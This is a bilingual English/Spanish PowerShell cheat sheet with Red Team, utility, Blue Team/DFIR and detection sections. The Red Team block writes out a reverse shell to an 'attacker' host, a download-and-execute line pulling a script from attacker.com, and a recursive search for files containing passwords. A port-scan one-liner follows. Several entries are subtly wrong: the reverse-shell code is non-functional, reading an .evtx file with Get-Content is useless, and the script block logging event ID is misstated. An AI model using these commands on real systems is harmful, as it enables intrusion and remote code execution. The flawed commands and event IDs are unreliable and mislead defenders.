---
title: PowerShell One-liners
phase: oneliners
platform: windows
tags: [powershell, one-liner, windows, scripting]
risk: medium
attack_tactic: NA
attack_technique: NA
data_sources: []
last_review: 2026-05-25
---

# PowerShell One-liners

### Red Team

```powershell
# Reverse shell
powershell -nop -c "IEX (New-Object Net.Sockets.TCPClient('attacker',port)).GetStream().Read((New-Object Byte[] 1024),0,1024);IEX ([Text.Encoding]::ASCII.GetString((New-Object Byte[] 1024)))"

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Spawn calc (testing)
Start-Process calc.exe

# enumerate local users
Get-LocalUser

# enumerate processes
Get-Process | Select-Object Name, Id, Path

# Get scheduled tasks
Get-ScheduledTask | Select-Object TaskName, State

# buscar archivos con password en contenido
Get-ChildItem C:\\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### One-liners útiles

```powershell
# Port scan
1..1024 | ForEach-Object { try { $sock = New-Object System.Net.Sockets.TcpClient('target',$_); $sock.Close(); Write-Output "$_ open" } catch {} }

# enumerar servicios
Get-Service | Where-Object {$_.Status -eq 'Running'}

# extraer servicios con rutas no estandar
Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch 'C:\\Windows' } | Select-Object Name, PathName

# DNS resolution
Resolve-DnsName target.com
```

### Blue Team / DFIR

```powershell
# Ver eventos de login (últimos 100)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 100

# encontrar archivos recently modify
Get-ChildItem C:\\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }

# Parsear líneas de un log
Get-Content C:\\Windows\\System32\\winevt\\Logs\\Security.evtx | Select-String -Pattern "logon"
```

### Detección y Mitigación

- **Visibilidad:** PowerShell script block logging (EID 800), Sysmon EID 1 para procesos powershell.exe/powershell_ise.exe,-module logging.
- **Hardening:** Restringir PowerShell a admins, habilitación de script block logging, AMSI para análisis de scripts, constrain language mode.
